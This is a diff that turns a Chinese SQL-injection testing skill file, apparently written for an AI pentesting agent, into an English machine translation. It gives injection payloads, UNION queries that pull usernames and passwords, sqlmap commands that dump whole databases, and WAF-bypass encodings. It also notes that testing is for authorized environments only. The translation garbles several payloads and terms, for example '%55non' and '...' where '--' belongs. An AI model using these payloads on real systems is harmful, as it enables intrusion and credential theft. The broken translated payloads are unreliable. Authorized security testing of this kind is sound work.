@@ -1,102 +1,102 @@
 ---
 name: sql-injection-testing
-description: SQL注入测试的专业技能和方法论
+description: Professional skills and methodology for SQL injection testing
 version: 1.0.0
 ---
 
-# SQL注入测试技能
+# SQL Injection Testing Skills
 
-## 概述
+## Overview
 
-SQL注入是一种常见且危险的Web应用漏洞。本技能提供了系统化的SQL注入测试方法、检测技术和利用策略。
+SQL injection is a common and dangerous Web application vulnerability. This skill provides a systematic SQL injection testing methodology, detection techniques, and exploitation strategies.
 
-## 测试方法
+## Test Method
 
-### 1. 参数识别
-- 识别所有用户输入点：URL参数、POST数据、HTTP头、Cookie等
-- 重点关注：id、search、filter、sort等参数
-- 使用Burp Suite或类似工具拦截和修改请求
+### 1. Parameter Identification
+- Identification of all user input points: URL parameters, POST data, HTTP header, Cookie, etc.
+- Focus on parameters such as id, search, filter, and sort.
+- Interception and modification of requests using Burp Suite or similar tools
 
-### 2. 基础检测
-- 单引号测试：`'` - 查看是否出现SQL错误
-- 布尔盲注：`' AND '1'='1` vs `' AND '1'='2`
-- 时间盲注：`' AND SLEEP(5)--`
-- 联合查询：`' UNION SELECT NULL--`
+### 2. Basic Detection
+- Single Quote Test: `'` - See if there was a SQL error
+- Boolean blind injection: `' AND '1'='1` vs `' AND '1'='2`
+- Time-based blind injection: `' AND SLEEP(5)--`
+- UNION query: `' UNION SELECT NULL--`
 
-### 3. 数据库识别
-- MySQL：`' AND @@version LIKE '%mysql%'--`
-- PostgreSQL：`' AND version() LIKE '%PostgreSQL%'--`
-- MSSQL：`' AND @@version LIKE '%Microsoft%'--`
-- Oracle：`' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`
+### 3. Database Identification
+- MySQL:`' AND @@version LIKE '%mysql%'--`
+- PostgreSQL:`' AND version() LIKE '%PostgreSQL%'--`
+- MSSQL:`' AND @@version LIKE '%Microsoft%'--`
+- Oracle: `' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`
 
-### 4. 信息提取
-- 数据库名：`' UNION SELECT database()--`
-- 表名：`' UNION SELECT table_name FROM information_schema.tables--`
-- 列名：`' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
-- 数据提取：`' UNION SELECT username,password FROM users--`
+### 4. Information extraction
+- Database name: `' UNION SELECT database()--`
+- Table name: `' UNION SELECT table_name FROM information_schema.tables--`
+- List: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
+- Data extraction: `' UNION SELECT username, password FROM users--`
 
-## 工具使用
+## Using the Tools
 
 ### sqlmap
 ```bash
-# 基础扫描
+# Basic scan
 sqlmap -u "http://target.com/page?id=1"
 
-# 指定参数
+# Specify parameters
 sqlmap -u "http://target.com/page" --data="id=1" --method=POST
 
-# 指定数据库类型
+# Specify Database Type
 sqlmap -u "http://target.com/page?id=1" --dbms=mysql
 
-# 获取数据库列表
+# Retrieve Database List
 sqlmap -u "http://target.com/page?id=1" --dbs
 
-# 获取表
+# Fetch Table
 sqlmap -u "http://target.com/page?id=1" -D database_name --tables
 
-# 获取数据
+# Access to data
 sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
 ```
 
-### 手动测试
-- 使用Burp Suite的Repeater模块
-- 使用浏览器开发者工具
-- 编写Python脚本自动化测试
+### Manual Testing
+- Use Repeater module for Burp Suite
+- Use browser developers tool
+- Preparation of automated testing of Python scripts
 
-## 绕过技术
+## Bypass Techniques
 
-### WAF绕过
-- 编码绕过：URL编码、Unicode编码、十六进制编码
-- 注释绕过：`/**/`, `--`, `#`
-- 大小写混合：`SeLeCt`, `UnIoN`
-- 空格替换：`/**/`, `+`, `%09`(Tab), `%0A`(换行)
+### WAF Bypass
+- Encoding bypass: URL, Unicode, hexadecimal
+- Comment bypassed: `/**/`, `--`, `#`
+- Case mixed: `SeLeCt`, `UnIoN`
+- Space replacement: `/**/`, `+`, `%09` (Tab), `%0A` (line break)
 
-### 示例
+### Example
 ```
-原始：' UNION SELECT NULL--
-绕过1：'/**/UNION/**/SELECT/**/NULL--
-绕过2：'%55nion%20select%20null--
-绕过3：'/*!UNION*//*!SELECT*/null--
+Origanal:'UNION SELECT NULL...
+Bypass1:'/**/UNION/**/SELECT/**/NULL--
+Bypass2:'%55non%20select%20null...
+Bypass3:'/*! UNION*/*! SELECT*/null...
 ```
 
-## 验证和报告
+## Verification and Reporting
 
-### 验证步骤
-1. 确认可以执行SQL语句
-2. 提取数据库信息验证
-3. 评估影响范围（数据泄露、权限提升等）
-4. 记录完整的POC（请求/响应）
-5. 通过 `report_finding` 工具将确认的漏洞录入平台（本平台记录漏洞的唯一入口），字段涵盖位置、类型、严重度、复现步骤/PoC 与修复建议
+### Verification Steps
+1. Confirm that you can execute the SQL statement
+2. Validation for extracting database information
+3. Assessment of the scope of the impact (data leakage, enhanced authority, etc.)
+4. Record the complete POC (request/response)
+5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration
 
-### 报告要点
-- 漏洞位置和参数
-- 影响的数据和系统
-- 完整的利用步骤
-- 修复建议（参数化查询、输入验证等）
+### Reporting Checklist
+- Lacunae position and parameters
+- Data and systems of impact
+- Complete Utilization Steps
+- Remediation recommendations (parametric queries, input validation, etc.)
 
-## 注意事项
+## Important Notes
 
-- 仅在授权测试环境中进行
-- 避免对生产数据造成破坏
-- 谨慎使用DROP、DELETE等危险操作
-- 记录所有测试步骤以便复现
+- Perform only in an authorized testing environment
+- Avoid damage to production data
+- Use dangerous operations like DROP, DELETE, etc. with care
+- Record all test steps to repeat
